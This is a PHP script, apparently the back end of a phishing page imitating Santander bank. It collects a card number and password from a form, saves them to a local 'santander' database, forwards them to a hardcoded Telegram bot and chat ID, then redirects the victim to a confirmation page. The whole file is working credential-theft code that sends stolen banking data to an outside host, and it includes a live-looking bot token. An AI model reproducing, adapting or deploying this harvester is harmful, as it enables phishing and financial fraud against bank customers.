<?php
// Función para enviar mensaje a Telegram
function enviarATelegram($botToken, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array('chat_id' => $chatID, 'text' => $mensaje);

    // Usar cURL para realizar la solicitud POST
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/x-www-form-urlencoded"));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// Verifica si se reciben datos del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  
    // Recupera los datos del formulario
    $tarjeta = $_POST["tarjeta"];
    $contrasena = $_POST["contrasena"];

  // Conecta a la base de datos (cambia los valores según tu configuración)
  $servername = "localhost";
  $username = "root";
  $password = "";
  $dbname = "santander";

    // Crear conexión
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica la conexión
    if ($conn->connect_error) {
        die("La conexión a la base de datos falló: " . $conn->connect_error);
    }

    // Escapa los datos para prevenir inyección de SQL
    $tarjetaEscapada = $conn->real_escape_string($tarjeta);
    $contrasenaEscapada = $conn->real_escape_string($contrasena);

    // Inserta los datos en la base de datos
    $sql = "INSERT INTO tarjet (tarjeta, contrasena) VALUES ('$tarjetaEscapada', '$contrasenaEscapada')";

    if ($conn->query($sql) === TRUE) {
        // Datos insertados en la base de datos correctamente
        // Ahora envía los datos al bot de Telegram
        $botToken = "6169082160:AAGqt-AE-PLtLloU2lra76qrw7qduYuhdVY";
        $chatID = "2023990069";
        $mensaje = "Nueva entrada:\nTarjeta: $tarjeta\nContraseña: $contrasena";
        
        $resultadoTelegram = enviarATelegram($botToken, $chatID, $mensaje);

        // Verifica si el mensaje se envió correctamente a Telegram
        if ($resultadoTelegram) {
            // Redirige al usuario a compro.html
            header("Location: compro.html");
            exit();
        } else {
            echo "Error al enviar mensaje a Telegram";
        }
    } else {
        echo "Error al insertar datos: " . $conn->error;
    }

    // Cierra la conexión
    $conn->close();
}
?>